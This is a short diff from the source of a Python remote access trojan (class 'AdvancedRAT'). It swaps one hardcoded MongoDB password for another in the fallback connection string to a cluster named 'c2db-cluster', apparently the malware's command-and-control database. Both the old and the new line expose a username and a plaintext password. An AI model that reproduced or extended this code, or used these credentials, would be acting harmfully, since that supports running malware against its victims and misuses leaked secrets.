@@ -2881,7 +2881,7 @@ class AdvancedRAT:
             self._load_dotenv()
             mongodb_uri = os.environ.get('MONGODB_URI')
             if not mongodb_uri:
-                mongodb_uri = "mongodb+srv://manankamboj66_db_user:eABZd3jiAZmOfuNx@c2db-cluster.tag4k0q.mongodb.net/?appName=C2db-cluster"
+                mongodb_uri = "mongodb+srv://manankamboj66_db_user:manankamboj2010@c2db-cluster.tag4k0q.mongodb.net/?appName=C2db-cluster"
             
             mongodb_uri = _safe_mongo_uri(mongodb_uri)
             self.logger.info(f"Connecting to MongoDB with URI: {mongodb_uri[:35]}...")
